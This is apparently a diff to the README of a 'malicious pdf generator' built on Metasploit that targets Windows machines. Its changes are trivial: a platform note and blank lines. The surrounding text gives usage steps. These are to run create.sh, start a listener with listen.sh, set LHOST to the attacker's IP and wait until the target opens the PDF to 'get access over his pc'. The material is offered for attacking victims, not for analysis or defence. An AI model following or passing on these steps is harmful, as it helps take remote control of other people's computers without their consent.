@@ -2,7 +2,7 @@
 
 This is an easy to setup malicious pdf generator which uses metasploit framework.
 
-##This works only with Linux and Termus app##
+##This works only with Linux##
 
 This can exploit only windows
 Requirements:
@@ -36,7 +36,9 @@ $sudo bash create.sh
 To listen to the pdf, type:
 
 $sudo bash listen.sh
+
 $set LHOST <your_ip>
+
 $run
 
 Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
